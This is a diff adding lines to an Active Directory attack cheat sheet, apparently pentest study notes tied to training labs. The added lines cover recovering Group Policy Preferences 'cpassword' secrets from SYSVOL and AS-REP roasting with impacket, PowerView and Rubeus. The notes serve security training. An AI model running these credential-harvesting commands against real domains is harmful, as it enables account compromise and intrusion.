@@ -290,11 +290,14 @@ This is usually after the DHCP lease using TFTP.
 
 #### Group Policy Preferences (GPP)
 
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
 [![active_directory_gpo](../../../../cybersecurity/_badges/rootme/forensic/active_directory_gpo.svg)](https://www.root-me.org/en/Challenges/Forensic/Active-Directory-GPO)
 
 Group Policy Preferences (GPP) are stored within GPOs. They can be used to make settings persist even if GPOs are removed.
 
 Passwords may be stored in GPP, but the encryption algorithm is reversible, so it's a known insecure practice.
+
+The `cpassword` attribute contains the encrypted password.
 
 You can use impacket or [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) <small>(0.1k ⭐)</small>:
 
@@ -303,6 +306,8 @@ $ impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL
 ```
 
 ➡️ Look at: `\<domain>\SYSVOL\<domain>\Policies\<GPO GUID>\Machine\Preferences\Groups\Groups.xml`.
+
+➡️ You can try to find them using [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), metasploit, or nxc with the `gpp_autologin` module.
 </div><div>
 
 #### Passwords Stored Using Reversible Encryption
@@ -332,6 +337,8 @@ Some kerberos users may have been configured to not require Kerberos Pre Auth, l
 
 ```shell!
 $ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junkusername -no-pass
+PS> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+PS> .\Rubeus.exe asreproast /user:cn /nowrap /format:hashcat
 ```
 
 Refer to [cracking Kerberos Pre Auth Hash](/cybersecurity/cryptography/algorithms/hashing/index.md#kerberos-pre-auth-cracking).
